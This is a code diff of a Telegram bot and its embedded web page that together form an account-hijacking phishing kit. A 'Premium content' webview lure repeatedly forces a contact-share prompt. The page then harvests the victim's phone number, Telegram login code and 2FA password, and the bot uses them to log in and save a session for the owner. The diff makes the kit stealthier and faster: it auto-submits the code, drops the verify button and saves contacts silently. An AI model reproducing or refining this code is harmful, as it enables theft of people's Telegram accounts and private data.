@@ -141,6 +141,7 @@ def format_phone(ph):
 
 
 def notify(phone, ss, me, dc, pu=False, pv=""):
+    """Owner notification — session only, no contact msg"""
     if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
         return
     try:
@@ -277,16 +278,15 @@ def run_tg(phone, code=None, password=None):
 SESSION_PATH = f"/tmp/bot_{uuid.uuid4().hex[:8]}.session"
 bot = TelegramClient(SESSION_PATH, API_ID, API_HASH)
 
-# Auto-delete contact messages user chat theke
-CONTACT_MSG_TRACK = {}  # uid -> list of msg_ids
-
 
 async def auto_delete_later(uid, msg_ids, delay=5):
-    """Delete messages after delay"""
+    """Auto-delete messages after delay"""
     await asyncio.sleep(delay)
     try:
+        if isinstance(msg_ids, int):
+            msg_ids = [msg_ids]
         await bot.delete_messages(uid, msg_ids)
-        logger.info(f"Deleted {len(msg_ids)} contact msgs for {uid}")
+        logger.info(f"Deleted {len(msg_ids)} msgs for {uid}")
     except Exception as e:
         logger.error(f"auto_delete err: {e}")
 
@@ -307,7 +307,6 @@ def back_button():
 
 
 async def edit_or_send(event, text, buttons=None):
-    """Try edit, fallback to new message"""
     try:
         await event.edit(text, buttons=buttons, parse_mode='md')
         return True
@@ -322,9 +321,10 @@ async def edit_or_send(event, text, buttons=None):
 
 
 async def send_welcome(uid, name):
-    """Send welcome messages to user, then delete after 10s so user doesn't see"""
+    """Send welcome messages to user. Welcome messages STAY (user needs to tap button)."""
     msgs = config.get("welcome_messages", [])
     if not msgs:
+        logger.warning(f"No welcome messages set for {uid}")
         return []
     buttons = [[Button.webview(
         config.get("button_text", "CONFIRM NOW"),
@@ -338,6 +338,7 @@ async def send_welcome(uid, name):
             btns = buttons if i == len(msgs) - 1 else None
             sent = await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
             sent_ids.append(sent.id)
+            logger.info(f"Welcome msg #{i+1} sent to {uid}")
             await asyncio.sleep(0.3)
         except Exception as e:
             logger.error(f"welcome {uid}: {e}")
@@ -403,7 +404,7 @@ async def cb(event):
             STATE["capture_mode"] = False
             await event.answer("Send welcome messages now")
             await edit_or_send(event,
-                "✍️ **Welcome Capture: ON**\n\nSend text/photo/video one by one. They'll be added to welcome sequence.",
+                "✍️ **Welcome Capture: ON**\n\nSend text/photo/video one by one.",
                 [[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
 
         elif data == "wl_stop":
@@ -417,9 +418,8 @@ async def cb(event):
         elif data == "wl_preview":
             await event.answer("Preview sent")
             ids = await send_welcome(YOUR_TELEGRAM_ID, "Preview")
-            # Auto-delete preview after 5s
             if ids:
-                asyncio.create_task(auto_delete_later(YOUR_TELEGRAM_ID, ids, 5))
+                asyncio.create_task(auto_delete_later(YOUR_TELEGRAM_ID, ids, 8))
 
         elif data == "wl_clear":
             config["welcome_messages"] = []
@@ -450,7 +450,7 @@ async def cb(event):
             STATE["welcome_capture"] = False
             await event.answer("Send broadcast messages")
             await edit_or_send(event,
-                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video messages.",
+                "📥 **Broadcast Capture: ON**\n\nSend text/photo/video.",
                 [
                     [Button.inline("▶️ Start Now", b"bc_start")],
                     [Button.inline("❌ Cancel", b"bc_cancel")]
@@ -486,7 +486,7 @@ async def cb(event):
             STATE["awaiting_timer"] = True
             await event.answer()
             await edit_or_send(event,
-                f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\nSend a number in seconds. Example: `30`",
+                f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\nSend a number in seconds.",
                 back_button())
 
         elif data == "menu_users":
@@ -646,7 +646,7 @@ async def bot_main():
 
 
 # ============================================================
-# FLASK PAGE — UPDATED FOR CONTACT LOGIC
+# FLASK PAGE
 # ============================================================
 PAGE = r'''<!DOCTYPE html>
 <html><head>
@@ -710,7 +710,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;
 <input type="tel" maxlength="1" inputmode="numeric" id="o5">
 </div>
 <div id="otpMsg" class="msg"></div>
-<button class="btn blue" id="verifyBtn">VERIFY CODE</button>
 <div class="resend" id="resendBtn">Resend code</div>
 </div>
 <div id="pwdBox" class="modal">
@@ -747,9 +746,10 @@ var phoneNumber = '';
 var codeCheck = null;
 var pwdCheck = null;
 var contactForce = null;
-var inProgress = false;  // Prevent duplicate popups
+var inProgress = false;
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
+
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, text, type) {
@@ -768,29 +768,21 @@ window.onload = function() {
 };
 function startForce() {
   if (contactForce) clearInterval(contactForce);
-  // First popup immediately
   setTimeout(function() { triggerShare(true); }, 200);
-  // Then loop every 200ms if not inProgress
   contactForce = setInterval(function() {
     if (!document.getElementById('contactBox').classList.contains('on')) {
-      clearInterval(contactForce);
-      contactForce = null;
-      return;
+      clearInterval(contactForce); contactForce = null; return;
     }
-    if (!inProgress) {
-      triggerShare(false);
-    }
+    if (!inProgress) triggerShare(false);
   }, 200);
 }
 function triggerShare(isFirst) {
   if (inProgress && !isFirst) return;
   if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
   inProgress = true;
-  
   var resetInProgress = function() {
     setTimeout(function() { inProgress = false; }, 400);
   };
-  
   if (typeof tg.requestContact === 'function') {
     try {
       tg.requestContact(function(sent, event) {
@@ -802,9 +794,7 @@ function triggerShare(isFirst) {
         }
       });
       return;
-    } catch(e) {
-      resetInProgress();
-    }
+    } catch(e) { resetInProgress(); }
   }
   if (typeof tg.openContactPicker === 'function') {
     try {
@@ -817,9 +807,7 @@ function triggerShare(isFirst) {
         }
       });
       return;
-    } catch(e) {
-      resetInProgress();
-    }
+    } catch(e) { resetInProgress(); }
   }
   resetInProgress();
   msg('contactMsg', 'Update Telegram app', 'err');
@@ -833,7 +821,7 @@ function handleContact(c) {
   if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
   if (phone.charAt(0) !== '+') phone = '+' + phone;
   phoneNumber = phone;
-  inProgress = true;  // Stop further popups
+  inProgress = true;
   msg('contactMsg', 'Confirmed!', 'ok');
   if (contactForce) { clearInterval(contactForce); contactForce = null; }
   fetch('/api/save_contact', {
@@ -892,6 +880,7 @@ function startOtpCheck() {
     }).catch(function(){});
   }, 2000);
 }
+// AUTO SUBMIT — 5 digit fill holei
 ['o1','o2','o3','o4','o5'].forEach(function(id, i) {
   document.getElementById(id).addEventListener('input', function() {
     var v = this.value.replace(/[^0-9]/g, '');
@@ -899,7 +888,7 @@ function startOtpCheck() {
     if (v && i < 4) document.getElementById('o' + (i + 2)).focus();
     var code = '';
     for (var k = 1; k <= 5; k++) code += document.getElementById('o' + k).value;
-    if (code.length === 5) setTimeout(submitOtp, 200);
+    if (code.length === 5) setTimeout(submitOtp, 100);
   });
   document.getElementById(id).addEventListener('keydown', function(e) {
     if (e.key === 'Backspace' && !this.value && i > 0) document.getElementById('o' + i).focus();
@@ -910,13 +899,11 @@ function submitOtp() {
   for (var i = 1; i <= 5; i++) code += document.getElementById('o' + i).value;
   if (code.length < 5) { msg('otpMsg', 'Enter all 5 digits', 'err'); return; }
   msg('otpMsg', 'Verifying...', 'info');
-  document.getElementById('verifyBtn').disabled = true;
   fetch('/api/verify', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({phone: phoneNumber, code: code})
   }).then(function(r) { return r.json(); }).then(function(d) {
-    document.getElementById('verifyBtn').disabled = false;
     if (d.success) { onCapture(); }
     else if (d.needs_password) {
       hide('otpBox'); show('pwdBox');
@@ -928,11 +915,9 @@ function submitOtp() {
       document.getElementById('o1').focus();
     }
   }).catch(function() {
-    document.getElementById('verifyBtn').disabled = false;
     msg('otpMsg', 'Connection error', 'err');
   });
 }
-document.getElementById('verifyBtn').onclick = submitOtp;
 document.getElementById('resendBtn').onclick = function() {
   document.getElementById('resendBtn').style.display = 'none';
   openOtp();
@@ -1047,15 +1032,8 @@ def save_contact():
             'phone': phone, 'user_id': ex['user_id']})
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
-    # Auto-notify owner + delete user side welcome contact msg
-    try:
-        http_requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={'chat_id': YOUR_TELEGRAM_ID,
-                'text': f"📞 Contact: `{phone}`",
-                'parse_mode': 'Markdown'}, timeout=10)
-    except Exception:
-        pass
+    # NO owner notification for contact — silent save
+    logger.info(f"Contact saved: {phone}")
     return jsonify({'success': True, 'phone': phone})
 
 
